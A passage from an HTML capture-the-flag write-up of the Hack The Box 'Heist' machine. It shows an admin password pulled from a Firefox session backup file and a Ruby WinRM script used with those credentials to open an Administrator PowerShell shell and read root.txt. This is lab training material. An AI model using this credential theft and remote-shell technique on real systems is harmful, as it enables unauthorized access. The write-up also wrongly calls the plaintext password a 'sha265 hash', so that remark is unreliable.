+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8/23/2019&nbsp;&nbsp;&nbsp;4:08&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;77nc64t5.default<br>
+                <br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;Profiles&gt;&nbsp;cd&nbsp;77nc64t5.default<br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;77nc64t5.default&gt;&nbsp;dir<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8/23/2019&nbsp;&nbsp;&nbsp;3:03&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bookmarkbackups&nbsp;&nbsp;&nbsp;<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8/23/2019&nbsp;&nbsp;&nbsp;3:00&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;crashes<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8/23/2019&nbsp;&nbsp;&nbsp;4:12&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;datareporting<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:01&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;extensions<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:15&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;features<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:31&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gmp<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:07&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gmp-gmpopenh264<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:07&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gmp-widevinecdm<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:01&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;minidumps<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8/23/2019&nbsp;&nbsp;&nbsp;4:07&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;saved-telemetry-pings<br>
+                d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:28&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sessionstore-backups<br>
+                ...<br>
+                <br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;77nc64t5.default&gt;&nbsp;cd&nbsp;sessionstore-backups<br>
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;sessionstore-backups&gt;&nbsp;dir<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\sessionstore-backups<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:27&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1219&nbsp;previous.jsonlz4<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:28&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1554&nbsp;recovery.baklz4<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:28&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1768&nbsp;recovery.jsonlz4<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;8:02&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3534&nbsp;upgrade.jsonlz4-20190409155332
+            </div>
+        </div><br>
+        <br>
+        <code>cat</code> the <code>recovery.jsonlz4</code> file.<br>
+            <div class="codebox">
+                PS&nbsp;supportdesk\chase@SUPPORTDESK&nbsp;sessionstore-backups&gt;&nbsp;cat&nbsp;recovery.jsonlz4<br>
+                mozLz40<br>
+                ....<br>
+                _ìœò=admin@support.htb&amp;!ò<br>
+                password=4dD!5}x/re8]FBuZ&nbsp;n<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        You've found what looks to be a pretty convincing admin password (and a hard to crack sha265 hash, at that)<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Administrator Shell</strong></h2><br>
+        Modify Alamot's WinRM script to include the credentials you've just found.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/heist#&nbsp;nano&nbsp;winrm_alamot_admin.rb&nbsp;<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">require</span>&nbsp;<span style="color:#3ad900;font-weight:400">'winrm'</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Author:&nbsp;Alamot</span><br>
+                <br>
+                conn&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">WinRM::Connection</span>.new(&nbsp;<br>
+                &nbsp;&nbsp;endpoint:&nbsp;<span style="color:#3ad900;font-weight:400">'http://10.10.10.149:5985/wsman'</span>,<br>
+                &nbsp;&nbsp;user:&nbsp;<span style="color:#3ad900;font-weight:400">'Administrator'</span>,<br>
+                &nbsp;&nbsp;password:&nbsp;<span style="color:#3ad900;font-weight:400">'4dD!5}x/re8]FBuZ'</span>,<br>
+                )<br>
+                <br>
+                command=<span style="color:#3ad900;font-weight:400">""</span><br>
+                <br>
+                conn.shell(<span style="color:#ff0044;font-weight:400">:powershell</span>)&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;|shell|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">until</span>&nbsp;command&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"exit\n"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">do</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;shell.run(<span style="color:#3ad900;font-weight:400">"-join($id,'PS&nbsp;',$(whoami),'@',$env:computername,'&nbsp;',$((gi&nbsp;$pwd).Name),'&gt;&nbsp;')"</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(output.output.chomp)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command&nbsp;=&nbsp;gets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;shell.run(command)&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;|stdout,&nbsp;stderr|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">STDOUT</span>.print&nbsp;stdout<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">STDERR</span>.print&nbsp;stderr<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">end</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">end</span>&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;puts&nbsp;<span style="color:#3ad900;font-weight:400">"Exiting&nbsp;with&nbsp;code&nbsp;#{output.exitcode}"</span><br>
+                <span style="color:#ff9d00;font-weight:700">end</span>
+            </div>
+        </div><br>
+        <br>
+        Run Alamot's script against the target, and you'll be rewarded with an <code>Administrator</code> shell!<br>
+        Go grab <code>root.txt</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/heist#&nbsp;ruby&nbsp;winrm_alamot_admin.rb<br>
+                PS&nbsp;supportdesk\administrator@SUPPORTDESK&nbsp;Documents&gt;&nbsp;cd&nbsp;../Desktop<br>
+                PS&nbsp;supportdesk\administrator@SUPPORTDESK&nbsp;Desktop&gt;&nbsp;dir&nbsp;-force<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Users\Administrator\Desktop<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;&nbsp;&nbsp;Name<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----<br>
+                -a-hs-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/21/2019&nbsp;&nbsp;11:08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;282&nbsp;desktop.ini<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4/22/2019&nbsp;&nbsp;&nbsp;9:05&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;root.txt<br>
+                <br>
+                PS&nbsp;supportdesk\administrator@SUPPORTDESK&nbsp;Desktop&gt;&nbsp;cat&nbsp;root.txt<br>
+                50dfa3c...
+            </div>
+        </div>
+    </writeup>
+</section>
+</body>
+</html>
